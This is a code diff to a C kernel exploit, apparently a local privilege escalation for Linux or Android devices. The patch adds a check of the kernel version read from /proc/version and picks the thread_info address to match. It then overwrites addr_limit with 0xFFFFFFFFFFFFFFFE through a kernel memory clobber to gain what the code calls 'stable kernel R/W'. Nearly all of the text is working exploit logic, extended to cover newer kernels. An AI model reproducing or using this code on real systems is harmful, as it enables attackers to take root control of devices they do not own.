@@ -79,6 +79,7 @@
 int quiet = 0;
 
 int have_kallsyms = 0;
+int kernel3 = 1;
 
 struct kallsyms {
     unsigned long addresses;
@@ -974,6 +975,19 @@ unsigned long findSymbol(char* execName, unsigned long pointInKernelMemory, char
     return address;
 }
 
+void checkKernelVersion() {
+    kernel3 = 1;
+    FILE *k = fopen("/proc/version", "r");
+    if (k != NULL) {
+        char buf[1024]="";
+        fgets(buf, sizeof(buf), k);
+        if (NULL != strstr(buf, "Linux version 4"))
+            kernel3 = 0;
+    }
+    if (kernel3) message("MAIN: detected kernel version 3");
+        else message("MAIN: detected kernel version other than 3");
+}
+
 int main(int argc, char **argv)
 {
     if (argc >= 2)
@@ -987,6 +1001,8 @@ int main(int argc, char **argv)
             argc--;
         }
     }
+    
+    checkKernelVersion();
 
     message("MAIN: starting exploit for devices with waitqueue at 0x98");
 
@@ -1009,13 +1025,17 @@ int main(int argc, char **argv)
     else if (try > 0) {
         message("MAIN: took %d tries but did it", try);
     }
+    
+    unsigned long thread_info_ptr = kernel3 ? kstack : task_struct_ptr;
+    
     message("MAIN: task_struct_ptr = %lx", (unsigned long)task_struct_ptr);
-    message("MAIN: stack = %lx", kstack);
+    if (kernel3) 
+        message("MAIN: stack = %lx", kstack);
     message("MAIN: Clobbering addr_limit");
     unsigned long const src = 0xFFFFFFFFFFFFFFFEul;
 
     try = 0;
-    while(try < RETRIES && !clobber_data(kstack + 8, &src, 8)) {
+    while(try < RETRIES && !clobber_data(thread_info_ptr + 8, &src, 8)) {
         message("MAIN: **fail** retrying");
         try++;
     }
@@ -1026,9 +1046,7 @@ int main(int argc, char **argv)
         message("MAIN: took %d tries but did it", try);
     }
 
-    message("MAIN: current->kstack == 0x%lx", kernel_read_ulong(task_struct_ptr + OFFSET__task_struct__stack));
-
-    unsigned long thread_info_ptr = kstack;
+    message("MAIN: thread_info = 0x%lx", thread_info_ptr);
 
     setbuf(stdout, NULL);
     message("MAIN: should have stable kernel R/W now");
